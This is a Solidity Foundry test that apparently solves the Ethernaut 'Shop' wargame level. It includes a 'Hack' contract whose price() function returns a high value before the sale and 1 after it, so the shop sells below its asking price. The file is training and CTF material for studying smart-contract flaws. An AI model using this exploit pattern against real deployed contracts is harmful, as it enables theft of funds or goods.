// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
pragma experimental ABIEncoderV2;

import "../src/levels/Shop.sol";
import "../src/levels/ShopFactory.sol";
import "./utils/BaseTest.sol";
import "@openzeppelin/contracts/math/SafeMath.sol";

contract TestShop is BaseTest{
    using SafeMath for uint256;
    Shop level;


    constructor() public{
        levelFactory = new ShopFactory();
    }

    function setUp() public override{
        super.setUp();
    }
    function testRunLevel() public{
        runLevel();
    }
   function setupLevel() internal override{
        levelAddress = payable(this.createLevelInstance(true));
        level = Shop(levelAddress);
                
        assertEq(level.price(), 100);
        assertEq(level.isSold(), false);

    }

    function exploitLevel() internal override{
        vm.startPrank(player);
        Hack attack = new Hack();
        attack.buy(level);

        assertEq(level.isSold(), true);
        assertEq(level.price(), 1);
        vm.stopPrank();
    }
}
contract Hack{
    Shop public target ;

    function buy(Shop _target) external{
        target = _target;
        target.buy();
    } 

    function price() external view returns(uint){
        return target.isSold() ? 1:1000;
    }
}